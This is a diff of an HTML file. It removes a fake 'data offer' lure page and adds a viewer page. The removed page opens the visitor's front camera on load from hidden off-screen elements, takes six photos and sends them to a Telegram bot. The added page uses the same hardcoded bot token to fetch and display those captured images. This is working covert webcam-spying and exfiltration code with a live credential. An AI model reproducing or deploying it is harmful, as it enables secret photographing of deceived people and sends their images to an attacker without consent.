@@ -1,168 +1,74 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="si">
 <head>
   <meta charset="UTF-8" />
-  <title>Data Offers</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Telegram Bot Image List</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-    * { box-sizing: border-box; }
-    html, body {
+    body {
+      font-family: sans-serif;
+      background: #f2f2f2;
       margin: 0;
-      padding: 0;
-      height: 100%;
-      font-family: 'Poppins', sans-serif;
-      background: #000;
-      overflow: hidden;
-      color: white;
+      padding: 20px;
     }
-    video#bgVideo {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: 0;
-      filter: brightness(0.4) saturate(1.2);
-    }
-    .container {
-      position: relative;
-      z-index: 2;
-      background: rgba(25, 0, 0, 0.75);
-      padding: 30px;
-      max-width: 400px;
-      margin: 10% auto;
-      border-radius: 18px;
-      box-shadow: 0 0 20px #ff1744aa;
+    h1 {
       text-align: center;
     }
-    h2 {
-      margin-bottom: 24px;
-      font-size: 24px;
-      color: #ff4081;
-      text-shadow: 0 0 6px #ff4081aa;
-    }
-    select {
-      width: 100%;
-      padding: 12px;
-      border-radius: 12px;
-      background: #2d0000;
-      border: none;
-      color: white;
-      font-size: 16px;
-    }
-    button {
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+      gap: 10px;
       margin-top: 20px;
-      padding: 14px;
+    }
+    .gallery img {
       width: 100%;
-      font-weight: bold;
-      border-radius: 14px;
-      background: linear-gradient(45deg, #ff1744, #d500f9);
-      color: white;
-      border: none;
-      cursor: pointer;
-      box-shadow: 0 0 20px #ff1744aa;
-    }
-    button:hover {
-      transform: scale(1.05);
-    }
-    #video, #canvas {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      top: -9999px;
-      left: -9999px;
+      height: 150px;
+      object-fit: cover;
+      border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
     }
   </style>
 </head>
 <body>
+  <h1>📸 Telegram Bot Image List</h1>
+  <div id="gallery" class="gallery"></div>
 
-<video id="bgVideo" autoplay muted loop playsinline>
-  <source src="video.mp4" type="video/mp4">
-</video>
+  <script>
+    const token = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
 
-<div class="container">
-  <h2>📦 Select Your Data Offer</h2>
-  <select id="dataOffer">
-    <option value="">-- Select Amount --</option>
-    <option>500MB for 7 Days</option>
-    <option>1GB for 3 Days</option>
-    <option>2GB for 1 Day</option>
-    <option>5GB for Night Use</option>
-    <option>Unlimited (Fake)</option>
-  </select>
-  <button onclick="captureAndSend()">Get your data offer</button>
-</div>
+    async function loadImages() {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
+        const data = await res.json();
+        const gallery = document.getElementById('gallery');
+        gallery.innerHTML = '';
 
-<video id="video" autoplay playsinline muted></video>
-<canvas id="canvas" width="320" height="240"></canvas>
+        data.result.forEach(update => {
+          if (update.message && update.message.photo) {
+            const photoSizes = update.message.photo;
+            const fileId = photoSizes[photoSizes.length - 1].file_id; // largest size
+            fetchFile(fileId, gallery);
+          }
+        });
 
-<script>
-const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
-const chatId = "8182050140";
-
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const context = canvas.getContext("2d");
-let stream = null;
-
-window.onload = () => {
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(s => {
-      stream = s;
-      video.srcObject = stream;
-      video.addEventListener('loadedmetadata', () => {
-        video.play();
-        // Video ready, start auto capture
-        autoCapture(6, 1000); // 6 images, 1 second interval
-      });
-    })
-    .catch(err => {
-      alert("⚠️ Camera access denied!");
-      console.error(err);
-    });
-};
-
-async function captureAndSend(index) {
-  if (video.readyState < 2) {
-    console.log("Camera not ready yet — waiting...");
-    return;
-  }
-
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  const base64Img = canvas.toDataURL("image/jpeg").split(',')[1];
-  const blob = await fetch(`data:image/jpeg;base64,${base64Img}`).then(res => res.blob());
-
-  const form = new FormData();
-  form.append("chat_id", chatId);
-  form.append("photo", blob, `captured_${index}.jpg`);
-
-  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-    method: "POST",
-    body: form
-  })
-  .then(() => console.log(`✅ Image ${index} sent successfully!`))
-  .catch(e => console.error(`❌ Failed to send image ${index}`, e));
-}
-
-function autoCapture(totalImages, intervalMs) {
-  let count = 0;
-  const captureInterval = setInterval(() => {
-    if (count >= totalImages) {
-      clearInterval(captureInterval);
-      stream.getTracks().forEach(track => track.stop());
-      console.log("All captures done, camera stopped.");
-      return;
+      } catch (e) {
+        alert("⚠️ Error: " + e.message);
+        console.log(e);
+      }
     }
-    captureAndSend(count + 1);
-    count++;
-  }, intervalMs);
-}
-</script>
 
+    async function fetchFile(fileId, gallery) {
+      const fileRes = await fetch(`https://api.telegram.org/bot${token}/getFile?file_id=${fileId}`);
+      const fileData = await fileRes.json();
+      if (fileData.ok) {
+        const filePath = fileData.result.file_path;
+        const fileUrl = `https://api.telegram.org/file/bot${token}/${filePath}`;
+        const img = document.createElement('img');
+        img.src = fileUrl;
+        gallery.appendChild(img);
+      }
+    }
+
+    loadImages();
+  </script>
 </body>
 </html>
